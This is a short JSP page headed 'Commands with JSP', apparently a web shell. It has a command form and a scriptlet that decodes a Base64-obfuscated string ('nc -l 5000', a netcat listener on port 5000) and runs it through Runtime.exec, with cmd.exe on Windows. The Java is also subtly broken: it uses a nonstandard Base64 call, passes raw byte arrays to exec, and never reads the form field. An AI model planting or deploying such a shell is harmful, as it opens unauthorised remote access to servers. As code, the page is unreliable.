<%@ page import="java.util.*,java.io.*"%>
<%
%>
<HTML><BODY>
Commands with JSP
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
    String hidd = "bmMgLWwgNTAwMA==";
    byte[] decodedBytes = Base64.decode(hidd);
    Process p;
    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
        p = Runtime.getRuntime().exec("cmd.exe /C " + decodedBytes);
    }
    else{
        p = Runtime.getRuntime().exec(decodedBytes);
    }
    
%>
</pre>
</BODY></HTML>